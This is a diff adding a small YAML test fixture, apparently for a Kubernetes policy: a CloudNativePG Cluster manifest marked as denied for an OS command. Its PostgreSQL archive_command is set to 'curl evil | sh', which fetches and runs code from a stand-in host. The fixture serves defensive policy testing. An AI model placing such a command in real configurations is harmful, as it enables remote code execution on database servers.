@@ -1,0 +1,12 @@
+# user: system:serviceaccount:orchard:orchard-server
+# denied-by: OS-command
+"apiVersion": "postgresql.cnpg.io/v1"
+"kind": "Cluster"
+"metadata":
+  "name": "db"
+  "namespace": "orchard-policy-test"
+"spec":
+  "instances": 1
+  "postgresql":
+    "parameters":
+      "archive_command": "curl evil | sh"
